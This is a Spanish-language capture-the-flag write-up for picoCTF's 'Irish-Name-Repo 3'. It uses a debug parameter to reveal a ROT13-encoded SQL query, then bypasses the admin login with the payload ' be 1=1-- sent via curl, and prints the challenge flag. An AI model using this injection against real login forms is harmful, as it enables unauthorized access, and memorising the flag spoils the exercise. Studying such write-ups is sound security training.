## Irish-Name-Repo 3
## Objetivo
There is a secure website running at `https://jupiter.challenges.picoctf.org/problem/40742/` ([link](https://jupiter.challenges.picoctf.org/problem/40742/)) or http://jupiter.challenges.picoctf.org:40742. Try to see if you can login as admin!

## Hints
1. Seems like the password is encrypted.
## Datos de acceso al nivel
## Solución
El sitio web ofrecía una página de inicio de sesión de administrador:

```bash
<form action="login.php" method="POST">
    <fieldset>
        <div class="form-group">
            <label for="username">Username:</label>
            <input type="text" id="username" name="username" class="form-control">
        </div>
        <div class="form-group">
            <label for="password">Password:</label>
            <div class="controls">
                <input type="password" id="password" name="password" class="form-control">
            </div>
        </div>
        <input type="hidden" name="debug" value="0">

        <div class="form-actions">
            <input type="submit" value="Login" class="btn btn-primary">
        </div>
    </fieldset>
</form>
```

Usando la interfaz de depuración, podemos inspeccionar la consulta SQL:

```bash
┌──(kali㉿kali)-[~/SEGURIDAD7A]
 curl "https://2019shell1.picoctf.com/problem/12271/login.php" --data "password=test&debug=1"
<pre>password: test
SQL query: SELECT * FROM admin where password = 'grfg'
</pre><h1>Login failed.</h1>
```

La contraseña estaba encriptada de alguna manera. Dado el hecho de que se reemplazó por dos veces, esto podría ser un cifrado de sustitución.`t` `g` 

Con inyección simple:

```bash
┌──(kali㉿kali)-[~/SEGURIDAD7A]
 curl "https://2019shell1.picoctf.com/problem/12271/login.php" --data "password=' or 1=1--&debug=1"
<pre>password: ' or 1=1--
SQL query: SELECT * FROM admin where password = '' be 1=1--'
</pre>

┌──(kali㉿kali)-[~/SEGURIDAD7A]curl "https://2019shell1.picoctf.com/problem/12271/login.php" --data "password=' be 1=1--&debug=1" && echo
<pre>password: ' be 1=1--
SQL query: SELECT * FROM admin where password = '' or 1=1--'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{3v3n_m0r3_SQL_4424e7af}</p>
```

## Notas adicionales
## Referencias
